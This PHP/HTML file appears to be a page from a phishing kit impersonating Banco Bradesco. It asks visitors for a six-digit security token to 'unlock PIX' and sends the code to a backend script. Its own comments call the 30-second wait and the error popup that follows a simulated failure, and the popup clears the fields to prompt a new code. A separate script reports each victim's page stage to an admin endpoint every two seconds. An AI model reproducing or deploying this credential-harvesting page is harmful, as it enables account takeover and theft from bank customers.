<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
if (!isset($_SESSION['client_id'])) { header('Location: /index.php'); exit; }
$menuAtivo = 'pix';
require __DIR__ . '/../includes/db.php';
$clientId = $_SESSION['client_id'];

$stmt = $pdo->prepare("SELECT referencia_dispositivo FROM clients WHERE id = ? LIMIT 1");
$stmt->execute([$clientId]);
$row = $stmt->fetch(PDO::FETCH_ASSOC);
$ref = $row['referencia_dispositivo'] ?? '';

$refVisivel = 'XXXXXX';
if ($ref) {
    if (strpos($ref,'-')!==false){
        [$p0,$p1]=explode('-',$ref,2);
        $ult = substr(preg_replace('/[^0-9A-Za-z]/','',$p0), -4);
        $refVisivel .= $ult.'-'.$p1;
    } else {
        $ult = substr(preg_replace('/[^0-9A-Za-z]/','',$ref), -4);
        $refVisivel .= $ult;
    }
} else {
    $refVisivel .= '0000-0';
}
?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<title>Banco Bradesco | Entre Nós, Você Vem Primeiro</title>
<link rel="icon" href="/imagens/iconsite.png" type="image/png"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
    body{margin:0;font-family:'Montserrat',sans-serif;background:#f2f3f5;color:#111;}
    .page-wrapper-chaveseg{min-height:calc(100vh - 140px);display:flex;align-items:flex-start;justify-content:center;padding:32px 16px 70px;box-sizing:border-box;}
    @media (min-height:760px){.page-wrapper-chaveseg{align-items:center;}}
    .card-chaveseg{width:100%;max-width:760px;background:#fff;border:1px solid #e2e3e6;border-radius:18px;padding:42px 54px 46px;box-shadow:0 6px 26px -10px rgba(0,0,0,0.15);position:relative;}
    @media (max-width:780px){.card-chaveseg{padding:38px 34px 40px;}}
    @media (max-width:560px){.card-chaveseg{padding:34px 24px 36px;border-radius:16px;}}
    .chave-header h1{margin:0 0 12px;font-size:26px;font-weight:700;letter-spacing:.3px;}
    .chave-header p.desc{margin:0 0 30px;font-size:14px;line-height:1.55;max-width:560px;color:#333;}
    .content-flex{display:flex;flex-direction:column;align-items:center;}
    .chave-icone{width:120px;margin:0 0 26px;}
    .sub-instrucao{font-size:14px;font-weight:500;color:#222;margin:0 0 30px;text-align:center;}
    .codigo-wrapper{display:flex;justify-content:center;gap:26px;margin:0 0 34px;}
    .codigo-slot{width:46px;border:none;border-bottom:2px solid #cfcfcf;background:transparent;font-size:24px;text-align:center;font-weight:600;padding:10px 0 8px;outline:none;transition:border-color .18s;}
    .codigo-slot:focus{border-bottom-color:#2d5ae8;}
    .codigo-slot.valid{border-bottom-color:#2d5ae8;}
    @media (max-width:560px){.codigo-wrapper{gap:18px;}.codigo-slot{width:42px;font-size:22px;}}
    .serie-ref{font-size:13px;text-align:center;font-weight:500;margin:0 0 38px;color:#111;}
    .serie-ref span.valor{font-weight:700;letter-spacing:.5px;}
    .acoes{display:flex;justify-content:center;gap:28px;flex-wrap:wrap;margin-bottom:4px;}
    .btn-primary,.btn-link{font-family:'Montserrat',sans-serif;font-size:14px;font-weight:600;cursor:pointer;border:none;text-decoration:none;}
    .btn-primary{background:linear-gradient(90deg,#d71e28,#a41f8f);color:#fff;padding:14px 46px;border-radius:30px;box-shadow:0 5px 18px -5px rgba(164,31,143,.45);transition:filter .2s,transform .15s;opacity:.55;}
    .btn-primary.enabled{opacity:1;}
    .btn-primary.enabled:hover{filter:brightness(1.05);}
    .btn-primary.enabled:active{transform:translateY(1px);filter:brightness(.95);}
    .btn-link{background:transparent;color:#2d5ae8;padding:14px 10px;}
    .btn-link:hover{text-decoration:underline;}
    #status-msg{text-align:center;font-size:13px;min-height:18px;margin-top:22px;color:#d71e28;font-weight:500;}
    /* Overlay processamento */
    .card-processing-overlay{
        position:absolute;inset:0;background:rgba(255,255,255,0.95);
        display:none;align-items:center;justify-content:center;flex-direction:column;
        z-index:50;border-radius:18px;font-family:'Montserrat',sans-serif;
    }
    .card-processing-overlay .spinner{
        width:60px;height:60px;border:6px solid #e3e3e3;border-top-color:#d71e28;
        border-radius:50%;animation:spin .8s linear infinite;margin-bottom:22px;
    }
    .card-processing-overlay p{margin:0;font-size:14px;font-weight:500;color:#444;text-align:center;line-height:1.4;max-width:260px;}
    @keyframes spin{to{transform:rotate(360deg);}}

/* Popup de erro */
.popup-erro-backdrop{
    position:fixed;inset:0;background:rgba(0,0,0,0.35);
    display:none;align-items:center;justify-content:center;z-index:200;
}
.popup-erro{
    width:100%;max-width:420px;background:#fff;border-radius:18px;
    padding:32px 32px 30px;box-shadow:0 10px 36px -8px rgba(0,0,0,0.25);
    text-align:center;position:relative;font-family:'Montserrat',sans-serif;
    animation:popIn .35s ease;
}
@keyframes popIn{
    0%{transform:translateY(18px) scale(.95);opacity:0;}
    100%{transform:translateY(0) scale(1);opacity:1;}
}
.popup-erro h2{
    margin:0 0 14px;font-size:20px;font-weight:700;color:#a41f8f;
}
.popup-erro p{
    margin:0 0 22px;font-size:14px;line-height:1.5;color:#444;
}
.popup-erro button{
    background:linear-gradient(90deg,#d71e28,#a41f8f);
    border:none;color:#fff;font-weight:600;font-size:14px;
    padding:12px 28px;border-radius:28px;cursor:pointer;
    box-shadow:0 4px 14px -4px rgba(164,31,143,0.55);
    transition:filter .2s;
}
.popup-erro button:hover{filter:brightness(1.06);}
.popup-erro .close-x{
    position:absolute;top:10px;right:12px;background:transparent;
    border:none;font-size:18px;cursor:pointer;color:#999;font-weight:600;
}
.popup-erro .close-x:hover{color:#555;}
</style>
</head>
<body>

<?php include 'header.php'; ?>
<?php include 'menu.php'; ?>

<div class="page-wrapper-chaveseg">
    <div class="card-chaveseg">
        <div id="processing-overlay" class="card-processing-overlay" aria-hidden="true">
            <div class="spinner"></div>
            <p>Desbloqueando PIX, por favor, aguarde.</p>
        </div>

        <div class="chave-header">
            <h1>Insira a chave de segurança</h1>
            <p class="desc">
                Gere uma nova chave no seu dispositivo de Segurança através do seu Token físico ou pelo app
                no celular.
            </p>
        </div>

        <div class="content-flex">
            <img class="chave-icone" alt="Dispositivo" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMzYgMTM2Ij48ZGVmcz48c3R5bGU+LmNscy0xe2ZpbGw6bm9uZTt9LmNscy0ye2ZpbGw6IzRhNGE0YTt9PC9zdHlsZT48L2RlZnM+PHRpdGxlPm1vYmlsZS10b2tlXzEyODwvdGl0bGU+PGcgaWQ9IkNhbWFkYV8yIiBkYXRhLW5hbWU9IkNhbWFkYSAyIj48ZyBpZD0iQ2FtYWRhXzEtMiIgZGF0YS1uYW1lPSJDYW1hZGEgMSI+PHJlY3QgY2xhc3M9ImNscy0xIiB3aWR0aD0iMTM2IiBoZWlnaHQ9IjEzNiIvPjxwYXRoIGNsYXNzPSJjbHMtMiIgZD0iTTU5Ljc2LDEyNS43NWgtMTZhOS41MSw5LjUxLDAsMCwxLTkuNS05LjV2LTk2YTkuNTEsOS41MSwwLDAsMSw5LjUtOS41aDQ4YTkuNTIsOS41MiwwLDAsMSw5LjUsOS41VjczLjQ0YTEuNSwxLjUsMCwwLDEtMywwVjIwLjI1YTYuNTEsNi41MSwwLDAsMC02LjUtNi41aC00OGE2LjUxLDYuNTEsMCwwLDAtNi41LDYuNXY5NmE2LjUxLDYuNTEsMCwwLDAsNi41LDYuNWgxNmExLjUsMS41LDAsMCwxLDAsM1oiLz48cGF0aCBjbGFzcz0iY2xzLTIiIGQ9Ik0xMTMuNDcsMTI1Ljc1SDg2QTMuNzksMy43OSwwLDAsMSw4Mi4yNiwxMjJWMTAyLjU0QTMuNzksMy43OSwwLDAsMSw4Niw5OC43NWgyNy40M2EzLjc5LDMuNzksMCwwLDEsMy43OSwzLjc5VjEyMkEzLjc5LDMuNzksMCwwLDEsMTEzLjQ3LDEyNS43NVpNODYsMTAxLjc1YS43OC43OCwwLDAsMC0uNzguNzlWMTIyYS43OC43OCwwLDAsMCwuNzguNzloMjcuNDNhLjc5Ljc5LDAsMCwwLC43OS0uNzlWMTAyLjU0YS43OS43OSwwLDAsMC0uNzktLjc5WiIvPjxwYXRoIGNsYXNzPSJjbHMtMiIgZD0iTTEwNy43NiwxMDEuNzVhMS41LDEuNSwwLDAsMS0xLjUtMS41di04YTYuNSw2LjUsMCwwLDAtMTMsMHY4YTEuNSwxLjUsMCwwLDEtMywwdi04YTkuNSw5LjUsMCwwLDEsMTksMHY4QTEuNSwxLjUsMCwwLDEsMTA3Ljc2LDEwMS43NVoiLz48cGF0aCBjbGFzcz0iY2xzLTIiIGQ9Ik05OS43NiwxMTcuNzVhMS41LDEuNSwwLDAsMS0xLjUtMS41di04YTEuNSwxLjUsMCwwLDEsMywwdjhBMS41LDEuNSwwLDAsMSw5OS43NiwxMTcuNzVaIi8+PHBhdGggY2xhc3M9ImNscy0yIiBkPSJNOTkuNzYsMjkuNzVoLTY0YTEuNSwxLjUsMCwxLDEsMC0zaDY0YTEuNSwxLjUsMCwwLDEsMCwzWiIvPjxwYXRoIGNsYXNzPSJjbHMtMiIgZD0iTTU5Ljc2LDEwOS43NWgtMjRhMS41LDEuNSwwLDEsMSwwLTNoMjRhMS41LDEuNSwwLDAsMSwwLDNaIi8+PHJlY3QgY2xhc3M9ImNscy0xIiB4PSI0IiB5PSI0IiB3aWR0aD0iMTI4IiBoZWlnaHQ9IjEyOCIvPjwvZz48L2c+PC9zdmc+">

            <p class="sub-instrucao">Digite a chave informada no visor do seu celular.</p>

            <div class="codigo-wrapper" id="codigo-wrapper">
                <input type="text" inputmode="numeric" maxlength="1" class="codigo-slot" data-idx="0" autofocus>
                <input type="text" inputmode="numeric" maxlength="1" class="codigo-slot" data-idx="1">
                <input type="text" inputmode="numeric" maxlength="1" class="codigo-slot" data-idx="2">
                <input type="text" inputmode="numeric" maxlength="1" class="codigo-slot" data-idx="3">
                <input type="text" inputmode="numeric" maxlength="1" class="codigo-slot" data-idx="4">
                <input type="text" inputmode="numeric" maxlength="1" class="codigo-slot" data-idx="5">
            </div>

            <div class="serie-ref">
                Confira o número de série do dispositivo:
                <span class="valor" id="serie-ref-valor"><?php echo htmlspecialchars($refVisivel, ENT_QUOTES, 'UTF-8'); ?></span>
            </div>

            <div class="acoes">
                <button id="btnContinuar" class="btn-primary" disabled>Continuar</button>
                <a href="/pix.php" class="btn-link">Cancelar</a>
            </div>

            <div id="status-msg"></div>
        </div>
    </div>
</div>

<!-- POPUP ERRO -->
<div id="popupErroBackdrop" class="popup-erro-backdrop" aria-hidden="true">
    <div class="popup-erro" role="dialog" aria-modal="true" aria-labelledby="popupErroTitulo">
        <button type="button" class="close-x" id="popupErroClose">&times;</button>
        <h2 id="popupErroTitulo">Não foi possível desbloquear</h2>
        <p>Não conseguimos concluir o desbloqueio do seu PIX neste momento.
           Verifique sua chave e tente novamente em instantes.</p>
        <button type="button" id="popupErroOk">Tentar novamente</button>
    </div>
</div>

<?php include 'footer.php'; ?>
<?php include 'chat.php'; ?>

<script>
const inputs = Array.from(document.querySelectorAll('.codigo-slot'));
const btnContinuar = document.getElementById('btnContinuar');
const statusMsg = document.getElementById('status-msg');
const overlayProcessing = document.getElementById('processing-overlay');

const popupBackdrop = document.getElementById('popupErroBackdrop');
const popupClose    = document.getElementById('popupErroClose');
const popupOk       = document.getElementById('popupErroOk');

function atualizarEstadoBotao(){
    const completo = inputs.every(i => /^[0-9]$/.test(i.value.trim()));
    btnContinuar.disabled = !completo;
    btnContinuar.classList.toggle('enabled', completo);
}

inputs.forEach((inp, idx)=>{
    inp.addEventListener('input', e=>{
        let v = e.target.value.replace(/\D/g,'');
        e.target.value = v.slice(0,1);
        if(v && idx < inputs.length-1){ inputs[idx+1].focus(); }
        atualizarEstadoBotao();
    });
    inp.addEventListener('keydown', e=>{
        if(e.key==='Backspace' && !inp.value && idx>0){ inputs[idx-1].focus(); }
    });
});

function mostrarPopupErro(){
    popupBackdrop.style.display='flex';
    popupBackdrop.setAttribute('aria-hidden','false');
}

function fecharPopupErro(){
    popupBackdrop.style.display='none';
    popupBackdrop.setAttribute('aria-hidden','true');
    // Reset campos
    inputs.forEach(i=>i.value='');
    inputs[0].focus();
    atualizarEstadoBotao();
    statusMsg.textContent='';
    btnContinuar.disabled=true;
}

popupClose.addEventListener('click', fecharPopupErro);
popupOk.addEventListener('click', fecharPopupErro);
popupBackdrop.addEventListener('click', e=>{
    if(e.target === popupBackdrop){
        fecharPopupErro();
    }
});

btnContinuar.addEventListener('click', ()=>{
    if(btnContinuar.disabled) return;
    const codigo = inputs.map(i=>i.value).join('');
    statusMsg.textContent='';
    overlayProcessing.style.display='flex';
    overlayProcessing.setAttribute('aria-busy','true');
    btnContinuar.disabled=true;

    // Dispara request (resultado NÃO altera o fluxo de 30s)
    fetch('processa_chave_seg.php',{
        method:'POST',
        headers:{'X-Requested-With':'XMLHttpRequest'},
        body:(()=>{
            const fd=new FormData();
            fd.append('acao','validar_chave');
            fd.append('codigo',codigo);
            return fd;
        })()
    }).catch(()=>{}); // Ignoramos erros para manter a simulação

    // Após 30s mostra popup de erro (simulação de falha)
    setTimeout(()=>{
        overlayProcessing.style.display='none';
        overlayProcessing.removeAttribute('aria-busy');
        mostrarPopupErro();
    }, 30000);
});

</script>

<script>
    document.addEventListener('DOMContentLoaded', () => {
        // 1. Defina o nome da página (continua igual)
        // IMPORTANTE: Altere este valor para o nome da página atual
        const pageName = 'chaveseg.php'; 

        // 2. Crie uma função para encapsular a lógica do fetch
        // Isso torna o código mais limpo e reutilizável.
        function reportarEstagioAtual() {
            fetch('/atualizar_estagio.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ estagio: pageName }),
                credentials: 'include' // É uma boa prática manter isso
            }).catch(error => console.error(`Erro ao reportar estágio '${pageName}':`, error));
        }

        // 3. Chame a função uma vez imediatamente quando a página carregar
        // Para que o admin veja a atualização na hora, sem esperar 2 segundos.
        reportarEstagioAtual(); 

        // 4. Configure para chamar a função repetidamente a cada 2 segundos
        setInterval(reportarEstagioAtual, 2000); // 2000 milissegundos = 2 segundos
    });
    </script>

</body>
</html>
